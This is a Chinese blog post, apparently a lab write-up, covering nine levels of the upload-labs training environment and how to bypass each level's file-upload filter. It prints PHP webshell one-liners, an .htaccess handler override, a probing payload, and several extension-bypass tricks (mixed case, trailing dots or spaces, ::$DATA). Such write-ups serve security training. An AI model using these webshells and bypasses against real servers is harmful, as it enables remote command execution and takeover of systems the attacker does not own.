---
layout: post
title: "文件上传漏洞"
date: 2025-03-07 17:50:17 +0800
description: "在上述配置中，FilesMatch表示匹配4.png的文件，当该文件名匹配成功后，SetHandler表示将该文件作为PHP类型的文件来进行处置。复制文件上传的路径，请求 GET /upload/upload/20200304.php5?④复制文件上传的路径，请求GET /upload/upload/webshell.php?①分析源码，黑名单包括了几乎所有php后缀文件，但是并没有屏蔽后缀为.htaccess的文件上传。②在文件后缀中加.符号，如8.ph.p，进行上传，成功后复制图片url地址。"
keywords: "文件上传漏洞"
categories: ['Web']
tags: ['网络安全', 'Php']
artid: "146101536"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146101536
    alt: "文件上传漏洞"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146101536
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146101536
cover: https://bing.ee123.net/img/rand?artid=146101536
image: https://bing.ee123.net/img/rand?artid=146101536
img: https://bing.ee123.net/img/rand?artid=146101536
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     文件上传漏洞
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atelier-sulphurpool-light" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h3>
     <a id="uploadlabs_0">
     </a>
     复现
     <strong>
      upload-labs漏洞
     </strong>
    </h3>
    <h4>
     <a id="1Pass1_Javascript__2">
     </a>
     (1)Pass-1 （Javascript 前端检查）
    </h4>
    <p>
     1、判断本关文件上传检测方式
    </p>
    <p>
     ①显示源码
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/7cd1ad693102fb7dc092bb211c27fd63.png"/>
    </p>
    <p>
     ②查看提示
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/ed6c0a7b28f12e556e1eb6c55bc4d114.png"/>
    </p>
    <p>
     得出结论为JS前端检测。
    </p>
    <p>
     2、针对防御措施进行绕过上传
    </p>
    <p>
     通过JS 限制上传的文件类型，对于这种情况，我们可以采用以下几种方式绕过：
    </p>
    <p>
     ①修改JS文件;
    </p>
    <p>
     ②上传png后缀的
     <a href="https://so.csdn.net/so/search?q=webshell&amp;spm=1001.2101.3001.7020">
      webshell
     </a>
     ，代理抓包，修改上传的文件后缀 （推荐）;
    </p>
    <p>
     ③禁用js。
    </p>
    <p>
     3、靶机实战
    </p>
    <p>
     ①这里使用“修改js文件”
    </p>
    <p>
     右键-查看元素，查看器中找到“οnsubmit=“return checkFile()””删除其值。
    </p>
    <p>
     此时就可以上传.php文件。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/416e6be942c09ed8bda307a47b2a5cbb.png"/>
    </p>
    <p>
     ②通过木马文件就可以进入后台。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/380c2e1f486cbdecdf2180e19bad4ece.png"/>
    </p>
    <h4>
     <a id="2Pass2__40">
     </a>
     （2）Pass-2 文件类型检查有缺陷
    </h4>
    <p>
     1、判断本关文件上传检测方式
    </p>
    <p>
     2、针对防御措施进行绕过上传
    </p>
    <p>
     对文件类型检查有缺陷-检查Content-Type标头是否与MIME 类型匹配。
    </p>
    <p>
     绕过方式：
    </p>
    <p>
     ①上传webshell.php 内容为：&lt;?php @system($\_GET\['cmd'\]); ?&gt;；
    </p>
    <p>
     ②抓包修改上传的Content-Type 类型为允许的类型 image/jpeg；
    </p>
    <p>
     ③放包，收到成功上传；
    </p>
    <p>
     ④复制文件上传的路径，请求GET /upload/upload/webshell.php?cmd=whoami。
    </p>
    <p>
     3、靶机实战
    </p>
    <p>
     ①
    </p>
    <p>
     上传webshell.php 内容为：&lt;?php @system($\_GET\['cmd'\]); ?&gt;；
    </p>
    <p>
     抓包修改上传的Content-Type 类型为允许的类型 image/jpeg；
    </p>
    <p>
     放包，收到成功上传。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/dbb68cc2201b3f49dce6e86b23546f89.png"/>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/e96eae1c51428243c073477a6fab0ba2.png"/>
    </p>
    <h4>
     <a id="3Pass3__72">
     </a>
     （3）Pass-3 黑名单限制不完全
    </h4>
    <p>
     1、判断本关文件上传检测方式
    </p>
    <p>
     2、针对防御措施进行绕过上传
    </p>
    <p>
     对于黑名单限制上传文件后缀的可以通过以下几种方式绕过：
    </p>
    <p>
     ①通过使用可被执行但不常见的后缀名，比如php5，shtml等等；
    </p>
    <p>
     ②上传恶意的配置文件（Apache .htaccess） 欺骗服务器将任意自定义文件扩展名映射到可知执行的③MIME类型；
    </p>
    <p>
     ④利用后端解析差异绕过限制。
    </p>
    <p>
     3、靶机实战
    </p>
    <p>
     ①上传 webshell.php3 内容为：&lt;?php @system($\_GET\['cmd'\]); ?&gt;；
    </p>
    <p>
     复制文件上传的路径，请求 GET /upload/upload/20200304.php5?cmd=whoami。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/7339f0174cbac817608ba51f2e035e91.png"/>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/cf961b95e0dc757f71e369c34876b79a.png"/>
    </p>
    <h4>
     <a id="4Pass4_96">
     </a>
     （4）Pass-4
    </h4>
    <ol>
     <li>
      <h6>
       <a id="_98">
       </a>
       判断本关文件上传检测方式
      </h6>
     </li>
    </ol>
    <p>
     ①分析源码，黑名单包括了几乎所有php后缀文件，但是并没有屏蔽后缀为.htaccess的文件上传。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/1a3ae5c4de40fb14bdc521f7eca1ebff.png"/>
    </p>
    <p>
     ②首先上传.htaccecc（此文件不要起名字，就是无标题文件）。
    </p>
    <pre><code class="prism language-cobol">
<span class="token operator">&lt;</span>code <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"language-plaintext hljs"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>FilesMatch <span class="token string">"4.png"</span><span class="token operator">&gt;</span>
    SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php
<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>code<span class="token operator">&gt;</span>
</code></pre>
    <p>
     在上述配置中，FilesMatch表示匹配4.png的文件，当该文件名匹配成功后，SetHandler表示将该文件作为PHP类型的文件来进行处置。
    </p>
    <p>
     ③然后上传含有
     <a href="https://so.csdn.net/so/search?q=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&amp;spm=1001.2101.3001.7020" title="一句话木马">
      一句话木马
     </a>
     的4.png文件。
    </p>
    <pre><code class="prism language-cobol">
<span class="token operator">&lt;</span>code <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"language-plaintext hljs"</span><span class="token operator">&gt;</span>ant<span class="token operator">=</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>echo <span class="token string">"3e231"</span><span class="token punctuation">;</span>$<span class="token constant">D</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span>$_SERVER<span class="token punctuation">[</span><span class="token string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token constant">D</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span>$<span class="token constant">D</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span>$_SERVER<span class="token punctuation">[</span><span class="token string">"PATH_TRANSLATED"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token constant">R</span><span class="token operator">=</span><span class="token string">"{$D}    "</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span>$<span class="token constant">D</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token function">foreach</span><span class="token punctuation">(</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">,</span><span class="token string">"Z"</span><span class="token punctuation">)</span><span class="token keyword">as</span> $<span class="token constant">L</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string">"{$L}:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token constant">R</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"{$L}:"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>$<span class="token constant">R</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>$<span class="token constant">R</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"    "</span><span class="token punctuation">;</span>$u<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">"posix_getegid"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span>@<span class="token function">posix_getpwuid</span><span class="token punctuation">(</span>@<span class="token function">posix_geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">;</span>$s<span class="token operator">=</span><span class="token punctuation">(</span>$u<span class="token punctuation">)</span><span class="token operator">?</span>$u<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">:</span>@<span class="token function">get_current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token constant">R</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">php_uname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token constant">R</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"    {$s}"</span><span class="token punctuation">;</span>echo $<span class="token constant">R</span><span class="token punctuation">;</span><span class="token punctuation">;</span>echo <span class="token string">"8e51f"</span><span class="token punctuation">;</span><span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>code<span class="token operator">&gt;</span>
</code></pre>
    <p>
     ④使用远程工具连接。
    </p>
    <h4>
     <a id="5Pass5_125">
     </a>
     （5）Pass-5
    </h4>
    <p>
     ①观察源码，具有强大的黑名单列表且屏蔽了后缀.htaccess文件上传，并且将后缀名自动转化为小写。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/a48ffe73b2fb5e3caf4cdabc667174bd.png"/>
    </p>
    <p>
     ②在文件后缀命中输入一个空格，此空格在上传完成后会自动消失。如5.p hp
    </p>
    <pre><code class="prism language-cobol">
<span class="token operator">&lt;</span>code <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"language-plaintext hljs"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">eval</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token operator">&gt;</span>
密码：<span class="token number">123</span><span class="token operator">&lt;</span><span class="token operator">/</span>code<span class="token operator">&gt;</span>
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/917e15f350e2f75d282e29e7e602e90c.png"/>
    </p>
    <p>
     ③使用远程工具连接。
    </p>
    <h4>
     <a id="6Pass6_143">
     </a>
     （6）Pass-6
    </h4>
    <p>
     ①分析代码，使用了黑名单，但并没有自动转换大小写，可将文件后缀改为大小写混合绕过
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/7987b49652fc3ff58afd048440271552.png"/>
    </p>
    <p>
     ②修改木马文件名为：6.pHP
    </p>
    <p>
     ③上传成功，复制图片url地址。使用远程工具连接。
    </p>
    <h4>
     <a id="7Pass7_153">
     </a>
     （7）Pass-7
    </h4>
    <p>
     ①查看源码，没有屏蔽空格。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/eaea7efb3fcf3894febb59d7b9c94bd6.png"/>
    </p>
    <p>
     ②在文件后缀前加空格7. pHP进行上传，上传成功，复制图片url地址。
    </p>
    <p>
     ③使用远程工具连接
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/38af38b9bd46683317cd0905dded6cbe.png"/>
    </p>
    <h4>
     <a id="8Pass8_165">
     </a>
     （8）Pass-8
    </h4>
    <p>
     ①查看源码，上传文件未进行文件后缀中.的屏蔽。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/ad3a3bc7769596d9b95745893455dae1.png"/>
    </p>
    <p>
     ②在文件后缀中加.符号，如8.ph.p，进行上传，成功后复制图片url地址
    </p>
    <p>
     ③使用远程工具连接
    </p>
    <h4>
     <a id="9Pass9_175">
     </a>
     （9）Pass-9
    </h4>
    <p>
     ①观察源码，没有对文件后缀的特殊字符进行处理。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/8030254114a06228e0505b6a45172fa1.png"/>
    </p>
    <p>
     ②上传9.php文件并用burpsuite进行抓包，在文件名后缀后加上特殊字符::$DATA进行特殊字符绕过。
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/blog_migrate/4b2ec2ae9f181dec11e999535f55bbaf.png"/>
    </p>
    <p>
     ③放行后，成功上传文件，复制url地址。
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f71715f34353833303732382f:61727469636c652f64657461696c732f313436313031353336" class_="artid" style="display:none">
 </p>
</div>


